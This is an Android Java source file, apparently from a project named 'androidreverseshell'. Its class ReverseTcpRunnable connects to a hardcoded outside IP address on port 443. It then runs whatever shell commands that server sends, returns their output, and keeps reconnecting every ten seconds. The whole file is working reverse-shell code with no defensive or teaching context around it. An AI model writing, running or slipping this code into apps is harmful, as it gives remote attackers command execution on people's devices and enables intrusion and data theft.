package com.anythingintellect.androidreverseshell;

import android.text.TextUtils;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;

/**
 * Created by ishan.dhingra on 21/07/16.
 */

public class ReverseTcpRunnable implements Runnable {
    private static final long RETRY_WAIT_TIME = 10000;
    String host = "122.161.191.49";
    int port = 443;
    private String directory = "/";
    private static final String CMD_CD = "cd";

    @Override
    public void run() {
        startReverseShell(host, port);
    }

    private void startReverseShell(String host, int port) {
        DataOutputStream toServer = null;
        BufferedReader fromServer = null;
        log("Connecting to " + host + ":" + port);
        try {
            Socket socket = new Socket(host, port);
            log("Connected!");
            toServer = new DataOutputStream(socket.getOutputStream());
            fromServer = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
            boolean run = true;
            // Required to handshake with server
            // Can be anything you like
            toServer.write("Hello".getBytes("UTF-8"));
            while (run) {
                String command = fromServer.readLine();
                if(TextUtils.isEmpty(command)) {
                    continue;
                }
                if (command.equalsIgnoreCase("bye")) {
                    run = false;
                    toServer.write("bye".getBytes("UTF-8"));
                    // Closing socket not required as we are closing stream in finally
                    continue;
                }
                String response = doCommand(command.split(" "));
                response = (TextUtils.isEmpty(response)) ? "invalid" : response;
                toServer.write(response.getBytes("UTF-8"));

            }
        } catch (IOException e) {
            e.printStackTrace();
            retry();
        } finally {
            try {
                if (toServer != null) {
                    toServer.close();
                }
                if (fromServer != null) {
                    fromServer.close();
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void retry() {
        try {
            Thread.sleep(RETRY_WAIT_TIME);
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        } finally {
            startReverseShell(host, port);
        }
    }


    // Entry point for all type of commands shell and custom
    private String doCommand(String[] commands) {

        if(TextUtils.isEmpty(commands[0])) {
            return "\n";
        }
        // Check if custom command and process
        String res = tryInternalCommand(commands);
        if (!TextUtils.isEmpty(res)) {
            return res;
        }
        commands = decideCommandName(commands);

        String response = doShellCommand(commands);
        log(response);
        return response;
    }

    private String doShellCommand(String[] commands) {
        // Executing command with specific directory
        // directory init is handled by custom command
        Process process;
        StringBuilder outputBuilder = new StringBuilder();
        BufferedReader reader = null;
        try {
            process = Runtime.getRuntime().exec(commands, null, new File(directory));
            reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line = "";
            while ((line = reader.readLine()) != null) {
                outputBuilder.append(line).append("\n");
                process.waitFor();
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return outputBuilder.toString();
    }
    private String tryInternalCommand(String[] cmd) {
        String res = null;
        switch (cmd[0]) {
            case CMD_CD: {
                String dir = cmd[1];
                if(dir.startsWith("/")) {
                    directory = dir;
                } else {
                    directory += dir;
                }
                res = "Working directory changed to: "+directory;
                break;
            }
        }
        log(res);
        return res;

    }


    private String[] decideCommandName(String[] commands) {
        String cmd = commands[0];
        // Point to bin, where most of the commands are
        commands[0] = "/system/bin/" + commands[0];
        // Check if in in bin
        File cmdFile = new File(commands[0]);
        if (!cmdFile.exists()) {
            // If not switch to plain command
            commands[0] = cmd;
        }
        return commands;
    }

    private void log(String msg) {
        if (msg != null) {
            Log.d("rvtcp", msg);
        }
    }
}